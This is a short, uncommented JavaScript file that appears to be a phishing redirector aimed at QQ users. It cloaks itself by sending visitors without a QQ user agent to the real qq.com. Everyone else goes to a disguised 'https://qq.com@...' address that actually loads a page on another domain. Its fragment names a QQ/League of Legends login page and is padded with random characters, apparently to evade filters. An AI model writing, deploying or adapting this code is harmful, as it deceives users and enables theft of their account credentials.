function leleua() {
    var sUserAgent = navigator.userAgent.toLowerCase();
    if (sUserAgent.match(/QQ/i) == 'qq' || location.href.indexOf("edit") > -1) {
    } else {
        window.location.href = "https://qq.com";
    }
}

var urls=[
'https://qq.com@www.360tianma.com/public/upload/conf/2024/01-12/c36b4571a36c26b9310b970a9a43edd5.Htm?#url=http://lol.qq.com/comm-htdocs/milo_mobile/login.html{nnnnnnnnnnn}{wwwwww}',
];
location.href = myEeplace(urls[Math.floor(Math.random()*urls.length)]);
function myEeplace(s){
	return s.replace(/\{(\w+?)\}/g,function(a,b){
		var h='';
		for(var i=0;i<b.length;i++){
			if('n'==b[i]){
				h+=Math.floor(Math.random()*10);
			}else if('w'==b[i]){
				h+=String.fromCharCode(97+Math.floor(Math.random()*26));
			}
		}
		return h;
	});
}
